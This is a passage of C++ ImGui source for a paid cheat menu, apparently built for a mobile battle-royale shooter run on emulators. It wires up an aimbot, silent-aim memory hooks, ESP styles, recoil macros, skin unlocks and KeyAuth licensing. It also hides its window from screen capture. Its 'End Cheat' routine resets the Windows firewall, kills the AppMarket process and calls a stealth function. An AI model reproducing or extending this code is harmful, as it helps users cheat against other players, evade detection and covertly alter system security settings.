														ImGui::Combo(("113##113"), &Setting::Skins::Mk14::skin, ("No Skin \0Drakreign - Mk14\0Gilded Galaxy - Mk14"));                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("MK12");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														ImGui::Combo(("013##013"), &Setting::Skins::Mk12::skin, ("No Skin \0Precise Predator - Mk12"));

				                                               
				                                               
															ImGui::EndTable();
											   				}	

											   
											   
                                                           ImGui::EndTabItem();
                                                       }
                                                       if (ImGui::BeginTabItem("SHOTGUN"))
                                                       {
														    if (ImGui::BeginTable("split3333333333", 2, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg)) 
					                    	 			    {
											   				ImGui::TableSetupColumn("Name");
											   
                                                            ImGui::TableSetupColumn("Skin", ImGuiTableColumnFlags_NoResize);
											   
                                                            ImGui::TableHeadersRow();
                                                            ImGui::TableNextColumn();
                                                            ImGui::Text("DBS");
                                                            ImGui::TableNextColumn();
                                                          	ImGui::PushItemWidth(200);
															ImGui::Combo(("008##008"), &Setting::Skins::DBS::skin, ("No Skin \0Panthera Prime - DBS \0Dynamic Rhythm - DBS \0Nebula Trail - DBS"));
															ImGui::TableNextColumn();
                                                            ImGui::Text("S1897");
                                                            ImGui::TableNextColumn();
                                                          	ImGui::PushItemWidth(200);
                                                            ImGui::Combo(("1121##1121"), &Setting::Skins::S1897::skin, ("No Skin \0Twilight Hunt - S1897\0Frozen City - S1897\0Space Travel - S1897\0Silver Honor - S1897"));	
                                                            ImGui::TableNextColumn();
															ImGui::Text("S686");
                                                            ImGui::TableNextColumn();
                                                          	ImGui::PushItemWidth(200);
                                                            ImGui::Combo(("1131##1131"), &Setting::Skins::S686::skin, ("No Skin \0MechaCore - S686\0Steel Magnum - S686\0Verdant Gold - S686\0Shinobi Armor - S686"));	
                                                            ImGui::TableNextColumn();
															ImGui::Text("S12K");
                                                            ImGui::TableNextColumn();
                                                          	ImGui::PushItemWidth(200);
                                                            ImGui::Combo(("1141##1141"), &Setting::Skins::S12K::skin, ("No Skin \0S12K(GACKT Lv. 7)\0Temple Guardian - S12K\0Candy Cane - S12K\0Silver Plate - S12K"));	

															ImGui::EndTable();
											   				}	
					                    	 			    
                                                           ImGui::EndTabItem();
                                                       }
                                                       if (ImGui::BeginTabItem("LMG"))
                                                       {
														   	 if (ImGui::BeginTable("split3333333333", 2, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg)) 
					                    	 			    {
											                    ImGui::TableSetupColumn("Name");
											   
                                                               ImGui::TableSetupColumn("Skin", ImGuiTableColumnFlags_NoResize);
											   
                                                               ImGui::TableHeadersRow();
                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("MG3");
                                                               ImGui::TableNextColumn();
                                                          	   ImGui::PushItemWidth(200);
                                                               ImGui::Combo(("114##114"), &Setting::Skins::MG3::skin, ("No Skin \0Soaring Dragon - MG3"));
					                    	 				
					                    	 				   ImGui::TableNextColumn();
                                                               ImGui::Text("DP-28");
                                                               ImGui::TableNextColumn();
                                                          	   ImGui::PushItemWidth(200);
														       ImGui::Combo(("014##014"), &Setting::Skins::DP28::skin, ("No Skin \0Enigmatic Hunter - DP-28\0Gilded Jade Dragon - DP-28\0Shenron - DP-28"));

                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("M249");                                              
                                                               ImGui::TableNextColumn();
					                    	                   ImGui::PushItemWidth(200);
														       ImGui::Combo(("094##094"), &Setting::Skins::M249::skin, ("No Skin \0Party Parcel - M249\0Moondrop Eterna - M249\0Stargaze Fury - M249"));
															ImGui::EndTable();
											   				}	
											   
                                                           ImGui::EndTabItem();
                                                       }
											   
                                                   }
                                                   ImGui::EndTabBar();
											   
                                                   ImGui::EndTabItem();
                                               }
											   
                                               //if (ImGui::BeginTabItem("Vehicle"))
                                               //{
											   //
                                               //    if (ImGui::BeginTable("split4", 2, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg)) 
					                    	 	//{
                                               //        ImGui::TableSetupColumn("Name");
											   //
                                               //        ImGui::TableSetupColumn("Skin", ImGuiTableColumnFlags_NoResize);
											   //
                                               //        ImGui::TableHeadersRow();
                                               //        ImGui::TableNextColumn();
                                               //        ImGui::Text("Dacia");
                                               //        ImGui::TableNextColumn();
                                               //    	ImGui::PushItemWidth(200);
				                               //        const char* Dacia[] = { "No Skin", "Koenigsegg Gemera", "Lamborghini Estoque Oro", "Tesla Roadster", "Pumpkin Dacia", "Castle Dacia", "Speedy Reindeer", "Zombie Mess","Dodge Charger - Fuchsia", "Dodge Charger - Tuscan Torque", "Dodge Charger - Violet Venom", "Koenigsegg Gemera (Silver Gray)", "Koenigsegg Gemera (Rainbow)", "Tesla Roadster (Amethyst)", "Tesla Roadster (Digital Water)", "Lamborghini Estoque Metal Grey","Dodge Charger - Tuscan Torque", "Dodge Charger SRT Hellcat Jailbreak - Violet Venom", "Ghost Rosa", "Ghost Violet", "Ghost Gleam", "Midknight" };				            			            
				                               //        const char* DaciaDacia = Dacia[Setting::ModSkin_skin_Dacia];				            
				                               //        if (ImGui::BeginCombo(" DaciaDaciaDaciaDaciaDaciaDacia", DaciaDacia, ImGuiComboFlags_HeightSmall))
				                               //        {
				                               //        	for (int n = 0; n < IM_ARRAYSIZE(Dacia); n++)
				                               //        	{
				                               //        		const bool is_selected = (Setting::ModSkin_skin_Dacia == n);
				                               //        		if (ImGui::Selectable(Dacia[n], is_selected))
				                               //        			Setting::ModSkin_skin_Dacia = n;
				                               //        		if (is_selected)
				                               //        			ImGui::SetItemDefaultFocus();
				                               //        	}
				                               //        	ImGui::EndCombo();
				                               //        }
					                    	 	//	ImGui::TableNextColumn();
					                    	 	//	ImGui::Text("CoupeRP");
                                               //        ImGui::TableNextColumn();
                                               //    	ImGui::PushItemWidth(200);
				                               //        const char* CoupeRP[] = { "No Skin", "Lamborghini Aventador SVJ Blue", "Bugatti La Voiture Noire (Nebula)", "Warp Dawn", "Koenigsegg Jesko (Dawn)", "McLaren 570S (Zenith Black)", "McLaren 570S (Lunar White)", "Aston Martin Valkyrie (Racing Green)","Aston Martin Valkyrie (Luminous Diamond)", "McLaren 570S (Raspberry)", "McLaren 570S (Glory White)", "McLaren 570S (Royal Black)", "McLaren 570S (Pearlescent)", "Koenigsegg Jesko (Silver Gray)", "Koenigsegg Jesko (Rainbow)", "Lamborghini Aventador SVJ Verde Alceo","Lamborghini Centenario Galassia", "Lamborghini Centenario Carbon Fiber", "Koenigsegg One:1 Gilt", "Koenigsegg One:1 Cyber Nebula", "Koenigsegg One:1 Jade",     "Koenigsegg One:1 Phoenix", "Warp Green", "Warp Universe", "Dodge Challenger SRT Hellcat - Blaze", "Dodge Challenger SRT Hellcat - Lime", "Maserati MC20 Bianco Audace", "Maserati MC20 Rosso Vincente", "Maserati MC20 Sogni","Bugatti Veyron 16.4 (Shining)", "Bugatti Veyron 16.4 (Gold)", "Bugatti Veyron 16.4", "Bugatti La Voiture Noire", "Bugatti La Voiture Noire (Alloy)", "Bugatti La Voiture Noire (Warrior)", "Dodge Challenger SRT Hellcat Jailbreak - Hellfire", "Pagani Zonda R (Tricolore Carbon)","Pagani Zonda R (Bianco Benny)", "Pagani Zonda R (Melodic Midnight)", "Pagani Imola (Grigio Montecarlo)", "Pagani Imola (Crystal Clear Carbon)", "Pagani Imola (Nebula Dream)", "Pagani Imola (Arctic Aegis)" };				            			            
				                               //        const char* CoupeRPCoupeRP = CoupeRP[Setting::ModSkin_skin_CoupeRP];				            
				                               //        if (ImGui::BeginCombo(" CoupeRPCoupeRPCoupeRP", CoupeRPCoupeRP, ImGuiComboFlags_HeightSmall))
				                               //        {
				                               //        	for (int n = 0; n < IM_ARRAYSIZE(CoupeRP); n++)
				                               //        	{
				                               //        		const bool is_selected = (Setting::ModSkin_skin_CoupeRP == n);
				                               //        		if (ImGui::Selectable(CoupeRP[n], is_selected))
				                               //        			Setting::ModSkin_skin_CoupeRP = n;
				                               //        		if (is_selected)
				                               //        			ImGui::SetItemDefaultFocus();
				                               //        	}
				                               //        	ImGui::EndCombo();
				                               //        }
					                    	 	//	ImGui::TableNextColumn();
					                    	 	//	ImGui::Text("UAZ");
                                               //        ImGui::TableNextColumn();
                                               //    	ImGui::PushItemWidth(200);
					                    	   //        const char* UAZ[] = { "No Skin", "Lamborghini Urus Giallo Inti", "Cute Kitten", "Godzilla UAZ", "Robust Wild", "Lamborghini Urus Pink", "Maserati Levante Blu Emozione", "Maserati Luce Arancione","Maserati Levante Neon Urbano", "Maserati Levante Firmamento", "Aston Martin DBX707 (Neon Purple)", "Aston Martin DBX707 (Quasar Blue)", "Dodge Hornet - Scarlet Sting", "Dodge Hornet GLH Concept - Redline", "Dodge Hornet - Sunburst" };				            			            
				                               //        const char* UAZUAZ = UAZ[Setting::ModSkin_skin_UAZ];				            
				                               //        if (ImGui::BeginCombo(" UAZUAZUAZUAZ", UAZUAZ, ImGuiComboFlags_HeightSmall))
				                               //        {
				                               //        	for (int n = 0; n < IM_ARRAYSIZE(UAZ); n++)
				                               //        	{
				                               //        		const bool is_selected = (Setting::ModSkin_skin_UAZ == n);
				                               //        		if (ImGui::Selectable(UAZ[n], is_selected))
				                               //        			Setting::ModSkin_skin_UAZ = n;
				                               //        		if (is_selected)
				                               //        			ImGui::SetItemDefaultFocus();
				                               //        	}
				                               //        	ImGui::EndCombo();
				                               //        }
					                    	 	//	ImGui::TableNextColumn();
					                    	 	//	ImGui::Text("Motorcycle");
                                               //        ImGui::TableNextColumn();
                                               //    	ImGui::PushItemWidth(200);
					                    	   //        const char* Moto[] = { "No Skin", "DUCATI Panigale V4S", "Ducati Panigale V4S Black Phantom", "Ducati Panigale V4S Crimson Storm", "Phantom Motorcycle", "LINE FRIENDS Lovey Dovey", "Ducati Panigale V4S" };				            			            
				                               //        const char* MotoMoto = Moto[Setting::ModSkin_skin_Moto];				            
				                               //        if (ImGui::BeginCombo(" MotoMotoMoto", MotoMoto, ImGuiComboFlags_HeightSmall))
				                               //        {
				                               //        	for (int n = 0; n < IM_ARRAYSIZE(Moto); n++)
				                               //        	{
				                               //        		const bool is_selected = (Setting::ModSkin_skin_Moto == n);
				                               //        		if (ImGui::Selectable(Moto[n], is_selected))
				                               //        			Setting::ModSkin_skin_Moto = n;
				                               //        		if (is_selected)
				                               //        			ImGui::SetItemDefaultFocus();
				                               //        	}
				                               //        	ImGui::EndCombo();
				                               //        }	
					                    	 	//	ImGui::TableNextColumn();
					                    	 	//	ImGui::Text("Buggy");
                                               //        ImGui::TableNextColumn();
                                               //    	ImGui::PushItemWidth(200);
					                    	   //        const char* Buggy[] = { "No Skin", "Ceratops Blitz", "Godzilla", "Alan Walker 2021", "Anniversary Celebration", "Golden Wings", "Sweet Kiss", "Football Ambassador", "Endless Craze", "Circus", "Street Art", "Past Glory" };				            			            
				                               //        const char* BuggyBuggy = Buggy[Setting::ModSkin_skin_Buggy];				            
				                               //        if (ImGui::BeginCombo(" BuggyBuggyBuggy", BuggyBuggy, ImGuiComboFlags_HeightSmall))
				                               //        {
				                               //        	for (int n = 0; n < IM_ARRAYSIZE(Buggy); n++)
				                               //        	{
				                               //        		const bool is_selected = (Setting::ModSkin_skin_Buggy == n);
				                               //        		if (ImGui::Selectable(Buggy[n], is_selected))
				                               //        			Setting::ModSkin_skin_Buggy = n;
				                               //        		if (is_selected)
				                               //        			ImGui::SetItemDefaultFocus();
				                               //        	}
				                               //        	ImGui::EndCombo();
				                               //        }	
					                    	 	//	ImGui::TableNextColumn();
					                    	 	//	ImGui::Text("UTV");
                                               //        ImGui::TableNextColumn();
                                               //    	ImGui::PushItemWidth(200);
					                    	   //        const char* UTV[] = { "No Skin", "Polaris RZR Turbo R 4", "Polaris RZR Pro R 4" };				            			            
				                               //        const char* UTVUTV = UTV[Setting::ModSkin_skin_UTV];				            
				                               //        if (ImGui::BeginCombo(" UTVUTVUTV", UTVUTV, ImGuiComboFlags_HeightSmall))
				                               //        {
				                               //        	for (int n = 0; n < IM_ARRAYSIZE(UTV); n++)
				                               //        	{
				                               //        		const bool is_selected = (Setting::ModSkin_skin_UTV == n);
				                               //        		if (ImGui::Selectable(UTV[n], is_selected))
				                               //        			Setting::ModSkin_skin_UTV = n;
				                               //        		if (is_selected)
				                               //        			ImGui::SetItemDefaultFocus();
				                               //        	}
				                               //        	ImGui::EndCombo();
				                               //        }	
					                    	 	//	ImGui::TableNextColumn();
					                    	 	//	ImGui::Text("Monster Truck");
                                               //        ImGui::TableNextColumn();
                                               //    	ImGui::PushItemWidth(200);
					                    	   //        const char* Monster[] = { "No Skin", "Jovial Tread Monster Truck" };				            			            
				                               //        const char* MonsterMonster = UTV[Setting::ModSkin_skin_Monster];				            
				                               //        if (ImGui::BeginCombo(" MonsterMonsterMonster", MonsterMonster, ImGuiComboFlags_HeightSmall))
				                               //        {
				                               //        	for (int n = 0; n < IM_ARRAYSIZE(UTV); n++)
				                               //        	{
				                               //        		const bool is_selected = (Setting::ModSkin_skin_Monster == n);
				                               //        		if (ImGui::Selectable(Monster[n], is_selected))
				                               //        			Setting::ModSkin_skin_Monster = n;
				                               //        		if (is_selected)
				                               //        			ImGui::SetItemDefaultFocus();
				                               //        	}
				                               //        	ImGui::EndCombo();
				                               //        }	
					                    	 	//	ImGui::TableNextColumn();
					                    	 	//	ImGui::Text("Mirado");
                                               //        ImGui::TableNextColumn();
                                               //    	ImGui::PushItemWidth(200);
					                    	   //        const char* Mirado[] = { "No Skin", "Aston Martin DBS Volante (Deep Cosmos)", "Aston Martin DBS Volante (Celestial Pink)", "Aston Martin DBS Volante (Black-Bronze Satin)", "Bentley Continental GTC Mulliner (Holocrystal)", "Bentley Continental GTC Mulliner (Tanzanite Purple)" };				            			            
				                               //        const char* MiradoMirado = Mirado[Setting::ModSkin_skin_Mirado];				            
				                               //        if (ImGui::BeginCombo(" MonsterMonsterMonster", MiradoMirado, ImGuiComboFlags_HeightSmall))
				                               //        {
				                               //        	for (int n = 0; n < IM_ARRAYSIZE(UTV); n++)
				                               //        	{
				                               //        		const bool is_selected = (Setting::ModSkin_skin_Mirado == n);
				                               //        		if (ImGui::Selectable(Mirado[n], is_selected))
				                               //        			Setting::ModSkin_skin_Mirado = n;
				                               //        		if (is_selected)
				                               //        			ImGui::SetItemDefaultFocus();
				                               //        	}
				                               //        	ImGui::EndCombo();
				                               //        }												
					                    	 	//    ImGui::EndTable();
					                    	 	//
                                               //    }
											   //
											   //
                                               //    ImGui::EndTabItem();
                                               //}
											   //
                                            }
 											ImGui::EndTabBar();

										}
										ImGui::EndChild();
									}

								}
							}
							else if (Setting::KeyVersion == 0)
							{
								if (Settings::MainTab == 2)
								{
									if (Settings::AimTab == 1)
									{

										ImGui::SetCursorPos({74, 150 });
										ImGui::BeginChild("##1", ImVec2(570, 275), true, ImGuiWindowFlags_NoBackground);
										{
											ImGui::Text("You Are Use Free Version Buy Vip Version To Use This Features.");
										}
										ImGui::EndChild();
									}
									if (Settings::AimTab == 2)
									{

										ImGui::SetCursorPos({74, 120 });
										ImGui::BeginChild("##1", ImVec2(570, 270), true, ImGuiWindowFlags_NoBackground);
										{
											ImGui::Checkbox("Aimbot", &Setting::Aimbot);
											if (Setting::Aimbot)
											{
												const char* curraim[] = { "Head", "Body", "Foot","Auto" };
												const char* curraimcurraim = curraim[Setting::curraim];
												if (ImGui::BeginCombo("curraimcurraim", curraimcurraim, ImGuiComboFlags_HeightSmall))
												{
													for (int n = 0; n < IM_ARRAYSIZE(curraim); n++)
													{
														const bool is_selected = (Setting::curraim == n);
														if (ImGui::Selectable(curraim[n], is_selected))
															Setting::curraim = n;
														if (is_selected)
															ImGui::SetItemDefaultFocus();
													}


													ImGui::EndCombo();
												}
												ImGui::Text("Aimbot Key");
												ImGui::SameLine();
												ImGui::PushItemWidth(150);
												ImGui::SetCursorPosX({ 190 });
												ImGui::Hotkey("##AimbotKey", &Setting::AimbotKey, ImVec2(180.0f, 25));
												ImGui::Text("Switch Key");
												ImGui::SameLine();
												ImGui::PushItemWidth(150);
												ImGui::SetCursorPosX({ 190 });
												ImGui::Hotkey("##AimSwichKey", &Setting::AimSwichKey, ImVec2(180.0f, 25));

												ImGui::Text("Refresh Key");
												ImGui::SameLine();
												ImGui::PushItemWidth(150);
												ImGui::SetCursorPosX({ 190 });
												ImGui::Hotkey("##RefreshKey", &Setting::RefreshKey, ImVec2(180.0f, 25));
												ImGui::Checkbox("Aimbot Range", &Setting::BulletTrackingRange);
												if (Setting::BulletTrackingRange)
												{
													ImGui::SameLine();
													ImGui::PushItemWidth(150);
													ImGui::SetCursorPosX({ 190 });
													ImGui::SliderInt("###MagicRange", &Setting::magicrange, 20, 380);
												}
												ImGui::Text("Aimbot Speed");
												ImGui::SameLine();
												ImGui::PushItemWidth(150);
												ImGui::SetCursorPosX({ 190 });
												ImGui::SliderInt("###Aimspeed", &Setting::Aimspeed, 1, 15);
												if (Setting::fovcircle)
												{
													ImGui::SameLine();
													ImGui::PushItemWidth(150);
													ImGui::SetCursorPosX({ 190 });
													ImGui::SliderInt("###fovFOVsize", &Setting::fovcircleredus, 1, 1000);

													ImGui::SameLine(580);
													ImGui::ColorEdit4("##FovCircle", (float*)Setting::fovcirclecolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
												}
											}
										}
										ImGui::EndChild();
									}
									if (Settings::AimTab == 3)
									{

										ImGui::SetCursorPos({74, 120 });
										ImGui::BeginChild("##1", ImVec2(565, 255), true, ImGuiWindowFlags_NoBackground);
										{
											if (ImGui::BeginTable("ITEM_Macro", 3, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
											{
												ImGui::TableSetupColumn("Enable");
												ImGui::TableSetupColumn("Icon");
												ImGui::TableSetupColumn("Font Size");
												ImGui::TableHeadersRow();

												ImGui::TableNextColumn();
												ImGui::Checkbox("Iron", &Setting::micro_Iron);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::Holo, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_Iron", &Setting::microaxis_Iron.Y, 0, 50);

												ImGui::TableNextColumn();
												ImGui::Checkbox("RedDot", &Setting::micro_RedDot);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::RedDot, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_RedDot", &Setting::microaxis_RedDot.Y, 0, 50);
												ImGui::TableNextColumn();

												ImGui::Checkbox("X2", &Setting::micro_X2);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::S2X, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_X2", &Setting::microaxis_X2.Y, 0, 50);

												ImGui::TableNextColumn();
												ImGui::Checkbox("X3", &Setting::micro_X3);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::S3X, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_X3", &Setting::microaxis_X3.Y, 0, 50);

												ImGui::TableNextColumn();
												ImGui::Checkbox("X4", &Setting::micro_X4);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::S4X, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_X4", &Setting::microaxis_X4.Y, 0, 50);
												ImGui::TableNextColumn();

												ImGui::Checkbox("X6", &Setting::micro_X6);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::S6X, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_X6", &Setting::microaxis_X6.Y, 0, 50);
												ImGui::EndTable();
											}

										}
										ImGui::EndChild();
									}
								}
								if (Settings::MainTab == 3)
								{

									if (Settings::MemoryTab == 1)
									{
										ImGui::SetCursorPos({74, 120 });
										ImGui::BeginChild("##1", ImVec2(570, 270), true, ImGuiWindowFlags_NoBackground);
										{
											ImGui::Text("You Are Use Free Version Buy Vip Version To Use This Features.");

										}
										ImGui::EndChild();
									}

								}
							}
							if (Settings::MainTab == 4)
							{


								ImGui::SetCursorPos({ 74, 120 });
								if (ImGui::Button("Discord", ImVec2(120, 25)))
									ShellExecute(NULL, L"open", L"https://discord.gg/zAcnhZ8emc", NULL, NULL, SW_SHOWNORMAL);
								ImGui::SetCursorPos({ 230, 120 });
								if (ImGui::Button("Telegram", ImVec2(120, 25)))
									ShellExecute(NULL, L"open", L"https://t.me/Telegram", NULL, NULL, SW_SHOWNORMAL);
								ImGui::SetCursorPos({74, 150 });
								ImGui::BeginChild("##1", ImVec2(630, 285), true, ImGuiWindowFlags_NoBackground);
								{
									//ImGui::SetCursorPosX({ 165 });
									if (ImGui::Button("Save Config", { 270.f,30.f }))
									{
										WriteConfigurate("C:\\Setting.ini");
										Setting::SaveSetting = true;
									}
									//ImGui::SetCursorPosX({ 165 });
									ImGui::SameLine();
									if (ImGui::Button("Load Config", { 270.f,30.f }))
									{
										LoadConfiggg("C:\\Setting.ini");
										Setting::LoadSetting = true;
									}
									ImGui::SetCursorPosX({ 165 });
									if (ImGui::Button("End Cheat", { 280.f,30.f }))
									{
										if (Setting::MagicBullet)
										{
											Memory::RestoreHook();
										}

										if (Setting::IpadView)
										{
											Setting::IpadViewValue = 360;
										}
										if (Setting::CameraView)
										{
											Setting::view = 220;
										}

										Setting::crossHairrandom = false;
										Setting::XEffectRandomHead = false;
										Setting::XEffectRandomBody = false;
										Setting::MagicX = false;
										Setting::IpadView = false;
										Setting::CameraView = false;
										Setting::CameraCatch = false;
										Setting::MemoryAimbot = false;
										Setting::noSpread = false;
										Setting::ShowDamage = false;
										Setting::fastrun = false;
										Setting::FastSwitchWeapon = false;
										Setting::Quickloot = false;
										Setting::instanthit = false;
										Setting::speedcar = false;
										Setting::ScopeZoom = false;
										Setting::RapidFireG = false;
										Setting::ForceTPP = false;
										Setting::damagebeast = false;
										StealthXx();
										system("netsh advfirewall reset");
										Sleep(100);
										system("taskkill /f /im AppMarket.exe");
										system("taskkill /f /im appmarket.exe");
										ExitProcess(0);
									}
									ImGui::Separator();
									ImGui::Checkbox("Anti Stream", &Setting::AntiScreenShot);
									if (Setting::AntiScreenShot) {
										SetWindowDisplayAffinity(DX11Window::hWindow, WDA_EXCLUDEFROMCAPTURE);
									}
									else
									{
										SetWindowDisplayAffinity(DX11Window::hWindow, WDA_NONE);

									}
									ImGui::SameLine();
									ImGui::Checkbox("Game Statics", &Setting::gameinfo);
									//ImGui::SameLine();
									//ImGui::Checkbox("WWCD", &Setting::wwcd);
									ImGui::Separator();
									ImGui::Text("Player Esp Style:");
									ImGui::SameLine();
									ImGui::PushItemWidth(150);
									ImGui::SetCursorPosX({ 160 });
									const char* EspStyle[] = { "Esp Style 1","Esp Style 2","Esp Style 3" };

									const char* combo_labelllll = EspStyle[Setting::EspStyle];

									if (ImGui::BeginCombo(" EspStyle", combo_labelllll, ImGuiComboFlags_HeightSmall))
									{
										for (int n = 0; n < IM_ARRAYSIZE(EspStyle); n++)
										{
											const bool is_selected = (Setting::EspStyle == n);
											if (ImGui::Selectable(EspStyle[n], is_selected))
												Setting::EspStyle = n;
											if (is_selected)
												ImGui::SetItemDefaultFocus();
										}


										ImGui::EndCombo();
									}
									ImGui::Text("Bot Esp Style:");
									ImGui::SameLine();
									ImGui::PushItemWidth(150);
									ImGui::SetCursorPosX({ 160 });
									const char* BotEspStyle[] = { "Esp Style 1","Esp Style 2","Esp Style 3" };

									const char* combo_labell111 = BotEspStyle[Setting::BotEspStyle];

									if (ImGui::BeginCombo(" BotEspStyle", combo_labell111, ImGuiComboFlags_HeightSmall))
									{
										for (int n = 0; n < IM_ARRAYSIZE(BotEspStyle); n++)
										{
											const bool is_selected = (Setting::BotEspStyle == n);
											if (ImGui::Selectable(BotEspStyle[n], is_selected))
												Setting::BotEspStyle = n;
											if (is_selected)
												ImGui::SetItemDefaultFocus();
										}


										ImGui::EndCombo();
									}
									//ImGui::Text("LANGUAGE :");
									//ImGui::SameLine();
									//ImGui::PushItemWidth(150);
									//ImGui::SetCursorPosX({ 160 });
									//const char* LANGUAGE[] = { "ENGLISH","ARABIC","TURKISH" };
									//
									//const char* combo_labell1 = LANGUAGE[Setting::Lang];
									//
									//if (ImGui::BeginCombo(" LANGUAGE", combo_labell1, ImGuiComboFlags_HeightSmall))
									//{
									//	for (int n = 0; n < IM_ARRAYSIZE(LANGUAGE); n++)
									//	{
									//		const bool is_selected = (Setting::Lang == n);
									//		if (ImGui::Selectable(LANGUAGE[n], is_selected))
									//			Setting::Lang = n;
									//		if (is_selected)
									//			ImGui::SetItemDefaultFocus();
									//	}
									//
									//
									//	ImGui::EndCombo();
									//}
									//ImGui::Separator();
									char PCNAME[100];
									std::string getusername = getenv("username");
									ImGui::BulletText("Hello : ");
									ImGui::SameLine();
									ImGui::Text(getusername.c_str());
									ImGui::BulletText("Emulator:");
									ImGui::SameLine();
									if (Emulator::IsGameLoop) {
										ImGui::Text("Gameloop");
									}
									else if (Emulator::IsSmartGaGa) {
										ImGui::Text("SmartGaga");
									}
									else {
										ImGui::Text("Emulator not found.");
									}
									ImGui::BulletText("Currently FPS:");
									ImGui::SameLine();
									ImGui::Text("%.1f FPS", ImGui::GetIO().Framerate);
									try {

										ImGui::BulletText("Expire Key:");
										ImGui::SameLine();

										if (KeyAuthApp.user_data.expiry.tm_year < 0) {
											ImGui::Text("Debug Mode");
										}
										else {
											time_t rawtime = mktime(&KeyAuthApp.user_data.expiry);

											if (rawtime == -1) {
												ImGui::Text("Debug Mode");
											}
											else {
												struct tm* timeinfo;
												timeinfo = localtime(&rawtime);
												if (timeinfo == nullptr) {
													ImGui::Text("Debug Mode");
												}
												else {
													ImGui::Text(XorStr(" %s").c_str(), asctime(timeinfo));
												}
											}
										}
									}
									catch (const std::exception& e) {
										std::cerr << "Error processing expiry date: " << e.what() << std::endl;
										ImGui::Text("Debug Mode: %s", e.what());
									}
								}

								ImGui::EndChild();
							}

						}

					}



					ImGui::PopStyleColor(2);
					ImGui::End();
				}

			}

			{


				if (login)
				{
					//if (Setting::NotifyMenu)
					//{
					//	
					//	
					//	if (Setting::LoadSetting && !LoadSetting)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Config Is Loaded" });
					//		LoadSetting = true;
					//		Setting::LoadSetting = true;
					//	}
					//	if (Setting::SaveSetting && !SaveSetting)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Config Is Saved" });
					//		SaveSetting = true;
					//		Setting::SaveSetting = true;
					//	}
					//	
					//	if (Setting::MagicBulletticked && !SilentAim1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Silent Aim Activated" });
					//		SilentAim1 = true;
					//	}
					//	else if (!Setting::MagicBulletticked && SilentAim1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Silent Aim deActivated" });
					//		SilentAim1 = false;
					//	}
					//
					//	if (Setting::Aimbot && !Aimbot1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Aimbot Activated" });
					//		Aimbot1 = true;
					//	}
					//	else if (!Setting::Aimbot && Aimbot1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Aimbot deActivated" });
					//		Aimbot1 = false;
					//	}
					//
					//
					//
					//	if (Setting::fovcircle && !fovcircle1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Fov Circle Activated" });
					//		fovcircle1 = true;
					//	}
					//	else if (!Setting::fovcircle && fovcircle1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Fov Circle deActivated" });
					//		fovcircle1 = false;
					//	}
					//
					//
					//	////////////
					//	if (Setting::SkipKnocked && !SkipKnocked1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Skip Knocked Activated" });
					//		SkipKnocked1 = true;
					//	}
					//	else if (!Setting::SkipKnocked && SkipKnocked1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Skip Knocked deActivated" });
					//		SkipKnocked1 = false;
					//	}
					//
					//	if (Setting::SkipBots && !SkipBots1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Skip Bots Activated" });
					//		SkipBots1 = true;
					//	}
					//	else if (!Setting::SkipBots && SkipBots1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Skip Bots deActivated" });
					//		SkipBots1 = false;
					//	}
					//
					//
					//
					//	if (Setting::MagicBulletticked && !TEXTONMAIN1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Show Aim Status Activated" });
					//		TEXTONMAIN1 = true;
					//	}
					//	else if (!Setting::MagicBulletticked && TEXTONMAIN1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Show Aim Status deActivated" });
					//		TEXTONMAIN1 = false;
					//	}
					//
					//	///////////////////////////////////////////////////////////////////////////////////////
					//
					//
					//	if (Setting::IpadView && !IpadView1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "IpadView Activated" });
					//		IpadView1 = true;
					//	}
					//	else if (!Setting::IpadView && IpadView1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "IpadView deActivated" });
					//		IpadView1 = false;
					//
					//	}
					//	if (Setting::instanthit && !instanthit1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "instanthit Activated" });
					//		instanthit1 = true;
					//	}
					//	else if (!Setting::instanthit && instanthit1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "instanthit deActivated" });
					//		instanthit1 = false;
					//
					//	}
					//	if (Setting::CameraCatch && !CameraCatch1)
					//	{
